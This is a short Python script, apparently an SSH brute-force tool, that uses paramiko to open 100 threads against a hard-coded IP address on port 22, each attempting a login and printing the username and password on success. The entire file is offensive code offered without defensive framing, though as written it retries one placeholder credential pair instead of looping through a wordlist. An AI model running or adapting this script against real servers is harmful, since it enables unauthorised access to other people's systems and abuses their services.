import paramiko
import socket
import threading

def ssh_brute(ip, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"Success! IP: {ip}, Username: {username}, Password: {password}")
        client.close()
    except (paramiko.AuthenticationException, socket.timeout) as e:
        print(f"Failed: IP: {ip}, Username: {username}, Password: {password}")

def main():
    target_ip = "172.100.43.251" # IP Target
    target_port = 22
    username="fake_user"
    password="fake_password"

    threads = []
    for i in range(100):
        thread = threading.Thread(target=ssh_brute, args=(target_ip, target_port, username, password))
        thread.start()
        threads.append(thread)
        print(f"Thread -> {i}")

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
